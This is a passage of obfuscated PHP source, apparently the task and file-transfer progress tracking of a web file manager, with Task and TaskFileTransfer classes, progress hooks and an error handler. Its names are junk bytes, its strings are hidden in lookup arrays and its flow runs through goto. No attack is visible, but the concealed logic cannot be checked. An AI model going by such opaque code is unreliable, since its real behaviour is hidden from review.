$A°Ğß‡¥¹[1260]); goto c”Ç××Ù÷; c”Ç××Ù÷: if (!$b¯¾ç‘Ü­Ë[$A°Ğß‡¥¹[1017]]) { return null; } $föÂ­ŸÓê = isset($b¯¾ç‘Ü­Ë[$A°Ğß‡¥¹[1019]]) ? $b¯¾ç‘Ü­Ë[$A°Ğß‡¥¹[1019]] : array(); if (!isset($föÂ­ŸÓê[$A°Ğß‡¥¹[1261]])) { return null; } goto FÆ’àÇÍ; fàÔ„±¤‹¾: } protected function _isFolder($b ‹Ç‚–¯â) { $E„¤‹õªÍ =& $_SERVER[Ä¿Ş°¨]; if ($b ‹Ç‚–¯â == $E„¤‹õªÍ[33] || $b ‹Ç‚–¯â == $E„¤‹õªÍ[8]) { return !0; } $CäÂ…Í¤àŒ = $this->objectMeta($b ‹Ç‚–¯â); return isset($CäÂ…Í¤àŒ[$E„¤‹õªÍ[29]]) && $CäÂ…Í¤àŒ[$E„¤‹õªÍ[29]] == $E„¤‹õªÍ[76] ? !0 : !1; } } goto e„ç“íè‚²; FÜ¦„£š¹Ö: function beforeShutdownError($D‰Ú„‰Ôí® = false, $aÙ¸æôâ¤° = '', $d¸»‘Ç”«¥ = '', $A–ñ¯µ£÷ = 0) { $cÂ“¸µ ƒ¦ =& $_SERVER[£›Åú§µ]; switch ($D‰Ú„‰Ôí®) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $dÃ£Ó–Âİ = $cÂ“¸µ ƒ¦[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $dÃ£Ó–Âİ = $cÂ“¸µ ƒ¦[40]; break; case E_STRICT: $dÃ£Ó–Âİ = $cÂ“¸µ ƒ¦[41]; break; case E_NOTICE: case E_USER_NOTICE: $dÃ£Ó–Âİ = $cÂ“¸µ ƒ¦[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $dÃ£Ó–Âİ = $cÂ“¸µ ƒ¦[43]; break; default: break; } if (!$dÃ£Ó–Âİ || $dÃ£Ó–Âİ == $cÂ“¸µ ƒ¦[42] || $dÃ£Ó–Âİ == $cÂ“¸µ ƒ¦[43]) { return; } $d¸»‘Ç”«¥ = $cÂ“¸µ ƒ¦[4] . str_replace($_SERVER[$cÂ“¸µ ƒ¦[37]], $cÂ“¸µ ƒ¦[20], $d¸»‘Ç”«¥); $e·ä˜Š»ËÆ = $dÃ£Ó–Âİ . $cÂ“¸µ ƒ¦[44] . $aÙ¸æôâ¤° . $cÂ“¸µ ƒ¦[44] . $d¸»‘Ç”«¥ . $cÂ“¸µ ƒ¦[44] . $A–ñ¯µ£÷; write_log($e·ä˜Š»ËÆ . $cÂ“¸µ ƒ¦[18] . get_caller_msg(1), $cÂ“¸µ ƒ¦[19]); } $_SERVER[$_SERVER[£›Åú§µ][45]] = $_SERVER[$_SERVER[£›Åú§µ][37]] . $_SERVER[£›Åú§µ][46]; $Eô£¨ÃëÙ¤ = strrev(base64_decode($_SERVER[£›Åú§µ][47])); goto EöÃîˆöÂÑ; Fâ–ÉõÓ—á: class Task { const STATYS_STOP = "\x73\x74\157\x70"; const STATYS_RUNNING = "\162\x75\156\156\151\156\147"; const STATYS_KILL = "\x6b\151\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($E²òƒñÌ¾Ô, $F¶ì¶£Ù‰ = '', $D•ŒÄÔæ”ƒ = 0, $FÉ«ˆä‡¸ = '') { goto DÂŞä â¿ï; eáÎ÷ÌğÜÃ: Hook::trigger($E‹°“”¢²ˆ[1410], $this->task); $this->task[$E‹°“”¢²ˆ[1404]] = timeFloat(); self::valueSet($this->task[$E‹°“”¢²ˆ[372]], $this->task); goto Dİí¶¿³—Ø; eå¶‹ĞÀ×: Hook::bind($E‹°“”¢²ˆ[1365], array($this, $E‹°“”¢²ˆ[1407])); Hook::bind($E‹°“”¢²ˆ[1408], array($this, $E‹°“”¢²ˆ[1409])); $this->startAfter(); goto eáÎ÷ÌğÜÃ; DÂŞä â¿ï: $E‹°“”¢²ˆ =& $_SERVER[Ä¿Ş°¨]; if (self::get($E²òƒñÌ¾Ô)) { return; } $this->task = array($E‹°“”¢²ˆ[372] => $E²òƒñÌ¾Ô, $E‹°“”¢²ˆ[1399] => USER_ID, $E‹°“”¢²ˆ[1304] => $FÉ«ˆä‡¸, $E‹°“”¢²ˆ[29] => $F¶ì¶£Ù‰, $E‹°“”¢²ˆ[965] => $E‹°“”¢²ˆ[33], $E‹°“”¢²ˆ[963] => $D•ŒÄÔæ”ƒ, $E‹°“”¢²ˆ[975] => 0, $E‹°“”¢²ˆ[1400] => 0, $E‹°“”¢²ˆ[1401] => 0, $E‹°“”¢²ˆ[1402] => timeFloat(), $E‹°“”¢²ˆ[1403] => 0, $E‹°“”¢²ˆ[1404] => 0, $E‹°“”¢²ˆ[1405] => 0, $E‹°“”¢²ˆ[1406] => 0, $E‹°“”¢²ˆ[683] => $E‹°“”¢²ˆ[1363]); goto eå¶‹ĞÀ×; Dİí¶¿³—Ø: } public function end() { goto E¢¸‰ª‘Æ‡; CŠñÙÜ¶¶ö: $A¬†‘’ÎÓæ = timeFloat() - $this->task[$C‘“±âôŞÅ[1402]]; self::log($C‘“±âôŞÅ[1411] . $this->task[$C‘“±âôŞÅ[372]] . $C‘“±âôŞÅ[1412] . $A¬†‘’ÎÓæ . $C‘“±âôŞÅ[1413]); Hook::unbind($C‘“±âôŞÅ[1365], array($this, $C‘“±âôŞÅ[1407])); goto f†‹‰÷ï”; E¢¸‰ª‘Æ‡: $C‘“±âôŞÅ =& $_SERVER[Ä¿Ş°¨]; if (!$this->task) { return; } if ($this->task[$C‘“±âôŞÅ[1404]]) { self::valueSet($this->task[$C‘“±âôŞÅ[372]], !1); } goto CŠñÙÜ¶¶ö; f†‹‰÷ï”: Hook::unbind($C‘“±âôŞÅ[1408], array($this, $C‘“±âôŞÅ[1409])); $this->endAfter(); $this->task = !1; goto BôÉÙªë®Í; BôÉÙªë®Í: } public function update($cœœ„ËöøÏ = 0) { goto d„°×ñˆï°; b„¦êöÎÍá: Hook::trigger($Cİ¥Èª“‘ç[1417], $aë †‡‹); self::valueSet($aë †‡‹[$Cİ¥Èª“‘ç[372]], $aë †‡‹); goto AªÊ¤§¤É; cŸŸÄÔÖ˜„: $this->updateAfter(); $aÀ³œÖ¢… = 0.2; if (timeFloat() - $aë †‡‹[$Cİ¥Èª“‘ç[1404]] < $aÀ³œÖ¢…) { return; } goto aŠµæÆåïª; aŠµæÆåïª: $D¿´½“×Ğ = self::get($aë †‡‹[$Cİ¥Èª“‘ç[372]]); $dÚçìëé† = $D¿´½“×Ğ[$Cİ¥Èª“‘ç[683]]; if ($dÚçìëé† == self::STATYS_KILL) { $AÎùóŒ¨îÍ = array($Cİ¥Èª“‘ç[1414] => LNG($Cİ¥Èª“‘ç[1415]), $Cİ¥Èª“‘ç[1017] => !1); Cache::set($Cİ¥Èª“‘ç[1416] . $this->task[$Cİ¥Èª“‘ç[372]], $AÎùóŒ¨îÍ, 30); $this->end(); die; } else { if ($dÚçìëé† == self::STATYS_STOP) { $F¥‹Ÿ¥”¤‚ = 2; $D¿´½“×Ğ[$Cİ¥Èª“‘ç[1405]] += $F¥‹Ÿ¥”¤‚; self::valueSet($aë †‡‹[$Cİ¥Èª“‘ç[372]], $D¿´½“×Ğ); sleep($F¥‹Ÿ¥”¤‚); $this->update(); return; } } goto a©ä£×òéï; dîÛ‡”‡“©: $aë †‡‹[$Cİ¥Èª“‘ç[975]] += $cœœ„ËöøÏ; $aë †‡‹[$Cİ¥Èª“‘ç[1403]] = timeFloat(); if ($aë †‡‹[$Cİ¥Èª“‘ç[963]]) { if ($aë †‡‹[$Cİ¥Èª“‘ç[963]] < $aë †‡‹[$Cİ¥Èª“‘ç[975]]) { $aë †‡‹[$Cİ¥Èª“‘ç[963]] = $aë †‡‹[$Cİ¥Èª“‘ç[975]]; } $b‹·µ¬Û‚ß = timeFloat() - $aë †‡‹[$Cİ¥Èª“‘ç[1402]] - $aë †‡‹[$Cİ¥Èª“‘ç[1405]]; $aë †‡‹[$Cİ¥Èª“‘ç[1400]] = $aë †‡‹[$Cİ¥Èª“‘ç[975]] / $aë †‡‹[$Cİ¥Èª“‘ç[963]]; $aë †‡‹[$Cİ¥Èª“‘ç[1401]] = $aë †‡‹[$Cİ¥Èª“‘ç[975]] / $b‹·µ¬Û‚ß; if ($aë †‡‹[$Cİ¥Èª“‘ç[1400]] > 0) { $aë †‡‹[$Cİ¥Èª“‘ç[1406]] = $b‹·µ¬Û‚ß * (1 - $aë †‡‹[$Cİ¥Èª“‘ç[1400]]) / $aë †‡‹[$Cİ¥Èª“‘ç[1400]]; } $aë †‡‹[$Cİ¥Èª“‘ç[1406]] = $aë †‡‹[$Cİ¥Èª“‘ç[1406]] <= 0 ? 0 : $aë †‡‹[$Cİ¥Èª“‘ç[1406]]; } goto cŸŸÄÔÖ˜„; d„°×ñˆï°: $Cİ¥Èª“‘ç =& $_SERVER[Ä¿Ş°¨]; $aë †‡‹ =& $this->task; if (!$aë †‡‹) { return; } goto dîÛ‡”‡“©; a©ä£×òéï: $aë †‡‹[$Cİ¥Èª“‘ç[683]] = $dÚçìëé† ? $dÚçìëé† : $aë †‡‹[$Cİ¥Èª“‘ç[683]]; $aë †‡‹[$Cİ¥Èª“‘ç[1405]] = $D¿´½“×Ğ[$Cİ¥Èª“‘ç[1405]] ? $D¿´½“×Ğ[$Cİ¥Èª“‘ç[1405]] : 0; $aë †‡‹[$Cİ¥Èª“‘ç[1404]] = timeFloat(); goto b„¦êöÎÍá; AªÊ¤§¤É: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($c²¤ÉàÁ•) { $bç“°ø‘™³ =& $_SERVER[Ä¿Ş°¨]; Cache::set($bç“°ø‘™³[1416] . $this->task[$bç“°ø‘™³[372]], $c²¤ÉàÁ•, 60); return $c²¤ÉàÁ•; } public static function get($C¥¢¸»›Ÿ) { return self::valueGet($C¥¢¸»›Ÿ); } public static function listData() { $dó¯ËæßÑé = self::valueGet(); return array_sort_by($dó¯ËæßÑé, $_SERVER[Ä¿Ş°¨][1402], !0); } public static function kill($Eø¾À·İ‡¤) { return self::changeStatus($Eø¾À·İ‡¤, self::STATYS_KILL); } public static function stop($a¨ÀÅõ‡) { return self::changeStatus($a¨ÀÅõ‡, self::STATYS_STOP); } public static function restart($Cíœá÷·—“) { return self::changeStatus($Cíœá÷·—“, self::STATYS_RUNNING); } public static function killAll() { $cÛ«÷µ†Å =& $_SERVER[Ä¿Ş°¨]; $c¥„Ü§³’ = self::listData(); foreach ($c¥„Ü§³’ as $Dæóù´Ù·) { self::kill($Dæóù´Ù·[$cÛ«÷µ†Å[372]]); } sleep(2); foreach ($c¥„Ü§³’ as $Dæóù´Ù·) { self::valueSet($Dæóù´Ù·[$cÛ«÷µ†Å[372]], !1); } } private static function changeStatus($D›ùî¿›½Ï, $CæÔ§Ù‹º) { goto A‡Ô§¯ó¨ ; A‡Ô§¯ó¨ : $a„Şö·á¶Ù =& $_SERVER[Ä¿Ş°¨]; $b…±†ÙøİÙ = self::valueGet($D›ùî¿›½Ï); if (!$b…±†ÙøİÙ) { return !1; } goto E²ÇŞ¤™; E²ÇŞ¤™: $b…±†ÙøİÙ[$a„Şö·á¶Ù[683]] = $CæÔ§Ù‹º; self::valueSet($D›ùî¿›½Ï, $b…±†ÙøİÙ); self::log($a„Şö·á¶Ù[1418] . $b…±†ÙøİÙ[$a„Şö·á¶Ù[372]] . $a„Şö·á¶Ù[1419] . $CæÔ§Ù‹º); goto fùÂĞ©ê; fùÂĞ©ê: return !0; goto A®ÔË×Ê»; A®ÔË×Ê»: } public static function valueGet($FÏ‹ØòÀ•ğ = false) { $F½‡£éæ‘“ =& $_SERVER[Ä¿Ş°¨]; if ($FÏ‹ØòÀ•ğ) { $A»é†ÙÎ±Ÿ = Model($F½‡£éæ‘“[403])->where(array($F½‡£éæ‘“[89] => $FÏ‹ØòÀ•ğ, $F½‡£éæ‘“[29] => $F½‡£éæ‘“[1420]))->find(); return $A»é†ÙÎ±Ÿ ? json_decode($A»é†ÙÎ±Ÿ[$F½‡£éæ‘“[355]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($eâÇ¾ù¹Š÷ = false) { goto Dñ ®„À©ç; aŒ¤§äÈ˜‘: return $cËÌÑğøâ; goto Eó½§²¦Š; f–×Ä´Ïçö: $cËÌÑğøâ = Model($a¨ÂğàÌËŸ[403])->where($AºŠÙ¦ÛÂÙ)->select(); $cËÌÑğøâ = $cËÌÑğøâ ? $cËÌÑğøâ : array(); foreach ($cËÌÑğøâ as $dŠ³ô•ÕÄ => $FŒšø‘ëì) { $cËÌÑğøâ[$dŠ³ô•ÕÄ] = json_decode($FŒšø‘ëì[$a¨ÂğàÌËŸ[355]], !0); } goto aŒ¤§äÈ˜‘; Dñ ®„À©ç: $a¨ÂğàÌËŸ =& $_SERVER[Ä¿Ş°¨]; $AºŠÙ¦ÛÂÙ = array($a¨ÂğàÌËŸ[29] => $a¨ÂğàÌËŸ[1420]); if ($eâÇ¾ù¹Š÷) { $AºŠÙ¦ÛÂÙ[$a¨ÂğàÌËŸ[1399]] = $eâÇ¾ù¹Š÷; } goto f–×Ä´Ïçö; Eó½§²¦Š: } public static function valueSet($FŸ”“–æÉğ, $F—•×ù­) { goto Câ Ê°àòá; Câ Ê°àòá: $CƒÍ‘‹¶İ¦ =& $_SERVER[Ä¿Ş°¨]; if (!$F—•×ù­) { return Model($CƒÍ‘‹¶İ¦[403])->where(array($CƒÍ‘‹¶İ¦[89] => $FŸ”“–æÉğ, $CƒÍ‘‹¶İ¦[29] => $CƒÍ‘‹¶İ¦[1420]))->delete(); } $F°ÊºÉÃ¸§ = json_encode($F—•×ù­); goto BÂ¬µŠÑ¨è; BÂ¬µŠÑ¨è: if (!$F°ÊºÉÃ¸§) { ob_start(); var_dump($F—•×ù­); $e¬ğåè·º = ob_get_clean(); self::log($CƒÍ‘‹¶İ¦[1421] . json_encode_force($e¬ğåè·º)); } if (!$FŸ”“–æÉğ || !$F—•×ù­[$CƒÍ‘‹¶İ¦[372]]) { return !1; } $b„ƒÔßÖ‡Ÿ = array($CƒÍ‘‹¶İ¦[29] => $CƒÍ‘‹¶İ¦[1420], $CƒÍ‘‹¶İ¦[1399] => USER_ID, $CƒÍ‘‹¶İ¦[89] => $FŸ”“–æÉğ, $CƒÍ‘‹¶İ¦[355] => $F°ÊºÉÃ¸§); goto D‰Ëô¤½½; D‰Ëô¤½½: Model($CƒÍ‘‹¶İ¦[403])->add($b„ƒÔßÖ‡Ÿ, array(), !0); goto bàã¤¯÷ù‘; bàã¤¯÷ù‘: } public static function log($eÇˆÇÓõì) { write_log($eÇˆÇÓõì, $_SERVER[Ä¿Ş°¨][1422]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto A¡çß…¢¤ã; EÜŠŠÀ‹ëÆ: Hook::bind($dšæ´÷ ÷»[1423], array($this, $dšæ´÷ ÷»[1424])); Hook::bind($dšæ´÷ ÷»[1425], array($this, $dšæ´÷ ÷»[1426])); Hook::bind($dšæ´÷ ÷»[1427], array($this, $dšæ´÷ ÷»[1428])); goto Bäë‰Ô°à›; fìºªÅÇ¹Ì: Hook::bind($dšæ´÷ ÷»[547], array($this, $dšæ´÷ ÷»[1431])); Hook::bind($dšæ´÷ ÷»[513], array($this, $dšæ´÷ ÷»[1432])); Hook::bind($dšæ´÷ ÷»[510], array($this, $dšæ´÷ ÷»[1432])); goto dÍÌ²Á‚Ş•; dÍÌ²Á‚Ş•: Hook::bind($dšæ´÷ ÷»[515], array($this, $dšæ´÷ ÷»[1432])); Hook::bind($dšæ´÷ ÷»[517], array($this, $dšæ´÷ ÷»[1432])); Hook::bind($dšæ´÷ ÷»[519], array($this, $dšæ´÷ ÷»[1432])); goto E»¢ëÅ–¾¼; cÑâô¥¦æÊ: $Cæ“Ù‡ÆÔ‘[$dšæ´÷ ÷»[1442]] = LNG($dšæ´÷ ÷»[1443]); $Cæ“Ù‡ÆÔ‘[$dšæ´÷ ÷»[1444]] = 0; $Cæ“Ù‡ÆÔ‘[$dšæ´÷ ÷»[1445]] = 0; goto CÇìĞ¶â¨; CÇìĞ¶â¨: $Cæ“Ù‡ÆÔ‘[$dšæ´÷ ÷»[965]] = $dšæ´÷ ÷»[33]; $Cæ“Ù‡ÆÔ‘[$dšæ´÷ ÷»[1446]] = $dšæ´÷ ÷»[33]; $Cæ“Ù‡ÆÔ‘[$dšæ´÷ ÷»[1447]] = 0; goto Bªˆ˜˜ÒÈù; A¡çß…¢¤ã: $dšæ´÷ ÷» =& $_SERVER[Ä¿Ş°¨]; $Cæ“Ù‡ÆÔ‘ =& $this->task; $this->sourceCopyFolder = !1; goto EÜŠŠÀ‹ëÆ; Bäë‰Ô°à›: Hook::bind($dšæ´÷ ÷»[543], array($this, $dšæ´÷ ÷»[1429])); Hook::bind($dšæ´÷ ÷»[544], array($this, $dšæ´÷ ÷»[1430])); Hook::bind($dšæ´÷ ÷»[546], array($this, $dšæ´÷ ÷»[1431])); goto fìºªÅÇ¹Ì; Fö¹œ÷×²Ê: Hook::bind($dšæ´÷ ÷»[1436], array($this, $dšæ´÷ ÷»[1437])); Hook::bind($dšæ´÷ ÷»[1438], array($this, $dšæ´÷ ÷»[1439])); Hook::bind($dšæ´÷ ÷»[1440], array($this, $dšæ´÷ ÷»[1441])); goto cÑâô¥¦æÊ; E»¢ëÅ–¾¼: Hook::bind($dšæ´÷ ÷»[1433], array($this, $dšæ´÷ ÷»[1434])); Hook::bind($dšæ´÷ ÷»[536], array($this, $dšæ´÷ ÷»[1435])); $this->sourceModelCopyFlag = !1; goto Fö¹œ÷×²Ê; Bªˆ˜˜ÒÈù: if (!$Cæ“Ù‡ÆÔ‘[$dšæ´÷ ÷»[1304]]) { $Cæ“Ù‡ÆÔ‘[$dšæ´÷ ÷»[1304]] = LNG($dšæ´÷ ÷»[1448]); } goto B†±¡Ù´¡; B†±¡Ù´¡: } protected function endAfter() { goto fÈŒ™²ÃŠ†; cØ¶×‚ï©Œ: Hook::unbind($d èÑéêß«[510], array($this, $d èÑéêß«[1432])); Hook::unbind($d èÑéêß«[515], array($this, $d èÑéêß«[1432])); Hook::unbind($d èÑéêß«[517], array($this, $d èÑéêß«[1432])); goto EÄ¹Û¡¨•; AÈŸòäÚß‡: Hook::unbind($d èÑéêß«[1436], array($this, $d èÑéêß«[1437])); Hook::unbind($d èÑéêß«[1438], array($this, $d èÑéêß«[1439])); Hook::unbind($d èÑéêß«[1440], array($this, $d èÑéêß«[1441])); goto CÍÎ”Œ”®; fÈŒ™²ÃŠ†: $d èÑéêß« =& $_SERVER[Ä¿Ş°¨]; Hook::unbind($d èÑéêß«[1423], array($this, $d èÑéêß«[1424])); Hook::unbind($d èÑéêß«[1425], array($this, $d èÑéêß«[1426])); goto dæ·Ù¦¼”«; FĞ‰î°šÆ: Hook::unbind($d èÑéêß«[546], array($this, $d èÑéêß«[1431])); Hook::unbind($d èÑéêß«[547], array($this, $d èÑéêß«[1431])); Hook::unbind($d èÑéêß«[513], array($this, $d èÑéêß«[1432])); goto cØ¶×‚ï©Œ; EÄ¹Û¡¨•: Hook::unbind($d èÑéêß«[519], array($this, $d èÑéêß«[1432])); Hook::unbind($d èÑéêß«[1433], array($this, $d èÑéêß«[1434])); Hook::unbind($d èÑéêß«[536], array($this, $d èÑéêß«[1435])); goto AÈŸòäÚß‡; dæ·Ù¦¼”«: Hook::unbind($d èÑéêß«[1427], array($this, $d èÑéêß«[1428])); Hook::unbind($d èÑéêß«[543], array($this, $d èÑéêß«[1429])); Hook::unbind($d èÑéêß«[544], array($this, $d èÑéêß«[1430])); goto FĞ‰î°šÆ; CÍÎ”Œ”®: } public function copyMoveStart($EÙ‰öë¥¶¿, $AÊª¦ˆøŠ, $b é•­¢, $EÜ†ÃìøËŒ) { } public function updateAfter() { goto A®¥‡ôİ¿¦; D³åÂÅÍ«„: if ($this->sourceModelCopyFlag) { return; } $c¾”ÛÉ‚…° = 0; if ($bø¯Úğèâ¬[$A¼™¤»Â¿Ï[1446]] == $A¼™¤»Â¿Ï[1025]) { $c¾”ÛÉ‚…° = $bø¯Úğèâ¬[$A¼™¤»Â¿Ï[1445]] * 0.5; } else { if ($bø¯Úğèâ¬[$A¼™¤»Â¿Ï[1446]] == $A¼™¤»Â¿Ï[102]) { $c¾”ÛÉ‚…° = $bø¯Úğèâ¬[$A¼™¤»Â¿Ï[1445]] * 0.5 + $bø¯Úğèâ¬[$A¼™¤»Â¿Ï[1444]] * 0.5; } } goto EùÏ‡àÔó; A®¥‡ôİ¿¦: $A¼™¤»Â¿Ï =& $_SERVER[Ä¿Ş°¨]; $bø¯Úğèâ¬ =& $this->task; if (!$bø¯Úğèâ¬[$A¼™¤»Â¿Ï[692]]) { return; } goto D³åÂÅÍ«„; EùÏ‡àÔó: $bø¯Úğèâ¬[$A¼™¤»Â¿Ï[1400]] = ($bø¯Úğèâ¬[$A¼™¤»Â¿Ï[1449]] + $c¾”ÛÉ‚…°) / $bø¯Úğèâ¬[$A¼™¤»Â¿Ï[692]]; if ($bø¯Úğèâ¬[$A¼™¤»Â¿Ï[1400]] > 0) { $d¨¦¦àÏ»„ = timeFloat() - $bø¯Úğèâ¬[$A¼™¤»Â¿Ï[1402]] - $bø¯Úğèâ¬[$A¼™¤»Â¿Ï[1405]]; $bø¯Úğèâ¬[$A¼™¤»Â¿Ï[1406]] = $d¨¦¦àÏ»„ * (1 - $bø¯Úğèâ¬[$A¼™¤»Â¿Ï[1400]]) / $bø¯Úğèâ¬[$A¼™¤»Â¿Ï[1400]]; } goto bˆº­‡ôÕ; bˆº­‡ôÕ: } public function addPath($eÉ¨ªÍá) { goto d‚ÜËõ‡ò”; f…‚Ò†ùÑ¦: $e…·šòÓ…ˆ = IO::infoWithChildren($eÉ¨ªÍá); $E«“¡Äèâ¾ = $fæ†‚˜á†¼[$Aä¶á°ÇïÛ[1450]] ? $fæ†‚˜á†¼[$Aä¶á°ÇïÛ[1450]][$Aä¶á°ÇïÛ[1451]] : 0; $fæ†‚˜á†¼[$Aä¶á°ÇïÛ[1450]] = array($Aä¶á°ÇïÛ[1451] => $E«“¡Äèâ¾ + 1, $Aä¶á°ÇïÛ[391] => $e…·šòÓ…ˆ[$Aä¶á°ÇïÛ[28]], $Aä¶á°ÇïÛ[75] => $e…·šòÓ…ˆ[$Aä¶á°ÇïÛ[75]], $Aä¶á°ÇïÛ[470] => $e…·šòÓ…ˆ[$Aä¶á°ÇïÛ[470]] ? $e…·šòÓ…ˆ[$Aä¶á°ÇïÛ[470]] : $e…·šòÓ…ˆ[$Aä¶á°ÇïÛ[75]]); goto fñù®©–ÓÙ; fñù®©–ÓÙ: if ($e…·šòÓ…ˆ[$Aä¶á°ÇïÛ[29]] == $Aä¶á°ÇïÛ[163]) { $fæ†‚˜á†¼[$Aä¶á°ÇïÛ[963]] += 1; } else { $fæ†‚˜á†¼[$Aä¶á°ÇïÛ[963]] += $e…·šòÓ…ˆ[$Aä¶á°ÇïÛ[80]][$Aä¶á°ÇïÛ[78]]; if ($e…·šòÓ…ˆ[$Aä¶á°ÇïÛ[374]]) { $fæ†‚˜á†¼[$Aä¶á°ÇïÛ[963]] += $e…·šòÓ…ˆ[$Aä¶á°ÇïÛ[80]][$Aä¶á°ÇïÛ[79]] + 1; } } $fæ†‚˜á†¼[$Aä¶á°ÇïÛ[692]] += $e…·šòÓ…ˆ[$Aä¶á°ÇïÛ[77]]; $this->update(); goto aå¾“ğƒÚ¬; d‚ÜËõ‡ò”: $Aä¶á°ÇïÛ =& $_SERVER[Ä¿Ş°¨]; if (!$eÉ¨ªÍá) { return; } $fæ†‚˜á†¼ =& $this->task; goto f…‚Ò†ùÑ¦; aå¾“ğƒÚ¬: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($DËô˜ËÜõ‚) { $FÚêïñÕ£ =& $_SERVER[Ä¿Ş°¨]; $f×ù†ï†è™ =& $this->task; $f×ù†ï†è™[$FÚêïñÕ£[1442]] = $DËô˜ËÜõ‚[$FÚêïñÕ£[28]]; $f×ù†ï†è™[$FÚêïñÕ£[965]] = $DËô˜ËÜõ‚[$FÚêïñÕ£[28]]; $this->update(); } public function copyFileStart($CÃ ‹µ™Ë•, $DËâ´£«Ã, $d¦Ğ½Ûôß, $fÁ„çÉ£Éã, $f°Ñ°ÎêÚ—, $f‘¿Õ‡‡‡£) { goto dƒ¨”‘‚†¹; d†ŸïÛ…–‡: $this->update(); goto DÃ‹éïí‰‰; bÚö‡™•îŸ: $aÜ‚á¨¨„Ò[$DÑéçØ¤¤ì[965]] = $DÑéçØ¤¤ì[33]; $aÜ‚á¨¨„Ò[$DÑéçØ¤¤ì[1446]] = $DÑéçØ¤¤ì[33]; $aÜ‚á¨¨„Ò[$DÑéçØ¤¤ì[1447]] = 0; goto d†ŸïÛ…–‡; FŠ†«ÙŸ“: $aÜ‚á¨¨„Ò[$DÑéçØ¤¤ì[1442]] = $CÃ¦ãŸ»Òœ; $aÜ‚á¨¨„Ò[$DÑéçØ¤¤ì[1444]] = (int) $CÃ ‹µ™Ë•->size($DËâ´£«Ã); $aÜ‚á¨¨„Ò[$DÑéçØ¤¤ì[1445]] = 0; goto bÚö‡™•îŸ; D±à¨ïÕŸğ: $GLOBALS[$DÑéçØ¤¤ì[1453]] = $f°Ñ°ÎêÚ—; $GLOBALS[$DÑéçØ¤¤ì[1452]] = $f‘¿Õ‡‡‡£; $aÜ‚á¨¨„Ò =& $this->task; goto FŠ†«ÙŸ“; dƒ¨”‘‚†¹: $DÑéçØ¤¤ì =& $_SERVER[Ä¿Ş°¨]; $CÃ¦ãŸ»Òœ = $f°Ñ°ÎêÚ—; if ($CÃ¦ãŸ»Òœ == $GLOBALS[$DÑéçØ¤¤ì[1452]]) { $CÃ¦ãŸ»Òœ = $GLOBALS[$DÑéçØ¤¤ì[1453]]; } goto D±à¨ïÕŸğ; DÃ‹éïí‰‰: } public function copyFileEnd($E†¼¶ø…½Ë, $b„ÈöÜãá, $cÍ—™’¯ÑÔ, $báÅ‰˜À†ö, $AÅğ¤ŠáŒ¦, $a•ó£¶‰±Ş) { $a‡Î¡™¹ =& $_SERVER[Ä¿Ş°¨]; $A±Âº‡§ =& $this->task; $A±Âº‡§[$a‡Î¡™¹[1445]] = $A±Âº‡§[$a‡Î¡™¹[1444]]; $A±Âº‡§[$a‡Î¡™¹[1446]] = $a‡Î¡™¹[33]; if ($AÅğ¤ŠáŒ¦ == $A±Âº‡§[$a‡Î¡™¹[1442]]) { $A±Âº‡§[$a‡Î¡™¹[1449]] += $A±Âº‡§[$a‡Î¡™¹[1444]]; $this->update(1); } else { $this->update(); $A±Âº‡§[$a‡Î¡™¹[1445]] = 0; } self::log($a‡Î¡™¹[1454] . $b„ÈöÜãá . $a‡Î¡™¹[66] . $báÅ‰˜À†ö . $a‡Î¡™¹[213] . $AÅğ¤ŠáŒ¦ . $a‡Î¡™¹[1455] . $A±Âº‡§[$a‡Î¡™¹[1442]]); } public function updateFileEnd($D•ğéÕä§›, $DÙğİ®ìÒ) { $cÛåéšÇô‹ =& $_SERVER[Ä¿Ş°¨]; $eÆ†Š¡µÈ =& $this->task; $eÆ†Š¡µÈ[$cÛåéšÇô‹[1442]] = $D•ğéÕä§›; $eÆ†Š¡µÈ[$cÛåéšÇô‹[1444]] = $DÙğİ®ìÒ; $eÆ†Š¡µÈ[$cÛåéšÇô‹[1449]] += $DÙğİ®ìÒ; $this->update(1); } public function sourceModelCopy($A‡‡ÅŠéÂÓ) { goto dçùóïî­¸; F¬ Š—ï™: $C’±¤ÓŞ¯° =& $this->task; $this->sourceModelCopyFlag = !0; $CÌÊâéå¤ñ = 0; goto E„³’…¡; dçùóïî­¸: $BõÌ­±Š· =& $_SERVER[Ä¿Ş°¨]; $DÓÆåºƒæÃ = $A‡‡ÅŠéÂÓ[0]; $F†µ¦êİà = $A‡‡ÅŠéÂÓ[1]; goto F¬ Š—ï™; E„³’…¡: switch ($DÓÆåºƒæÃ) { case $BõÌ­±Š·[511]: $CÌÊâéå¤ñ = 1; break; case $BõÌ­±Š·[514]: $C’±¤ÓŞ¯°[$BõÌ­±Š·[1442]] = $F†µ¦êİà[$BõÌ­±Š·[28]]; break; case $BõÌ­±Š·[516]: $CÌÊâéå¤ñ = intval($A‡‡ÅŠéÂÓ[$BõÌ­±Š·[359]] * 0.4); break; case $BõÌ­±Š·[518]: $CÌÊâéå¤ñ = intval($A‡‡ÅŠéÂÓ[$BõÌ­±Š·[359]] * 0.2); break; case $BõÌ­±Š·[520]: $CÌÊâéå¤ñ = intval($A‡‡ÅŠéÂÓ[$BõÌ­±Š·[359]] * 0.4); break; } $this->update($CÌÊâéå¤ñ); $this->sourceModelCopyFlag = !1; goto EÉî–Ä—Ö; EÉî–Ä—Ö: } public function sourceRemove($Fš¾‡«£¯, $CßØèò´á) { $a»Æ·…Œ·  =& $_SERVER[Ä¿Ş°¨]; $this->sourceModelCopyFlag = !0; $F†º¿Ş…Ã = 1; if (isset($Fš¾‡«£¯[$a»Æ·…Œ· [80]])) { $F†º¿Ş…Ã = $Fš¾‡«£¯[$a»Æ·…Œ· [80]][$a»Æ·…Œ· [78]] + $Fš¾‡«£¯[$a»Æ·…Œ· [80]][$a»Æ·…Œ· [79]] + 1; } $this->update($F†º¿Ş…Ã); $this->sourceModelCopyFlag = !1; } public function 